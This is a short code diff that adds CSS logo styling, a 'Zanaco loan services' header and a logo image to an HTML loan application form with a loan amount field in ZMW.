@@ -48,11 +48,37 @@
     button:hover {
       background: #004ecc;
     }
+     .logo {
+    width: 120px; /* adjust as needed */
+    margin-bottom: 20px;
+     }
+     .logo-container {
+    width: 100%;
+    height: 120px; /* change to your desired height */
+    overflow: hidden;
+    margin-bottom: 20px;
+}
+
+.logo-container .logo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover; /* fills container without distortion */
+    display: block;
+}
+.zanaco-header {
+    text-align: center;
+}
   </style>
 </head>
 <body>
 
 <div class="card">
+
+    <h1 class="zanaco-header"> Zanaco loan services</h1>
+    <div class="logo-container">
+          <img src="zanaco-dp.jpeg" class="logo">
+    </div>
+ 
   <h2>Loan Application</h2>
 
   <label>Loan Amount (ZMW)</label>
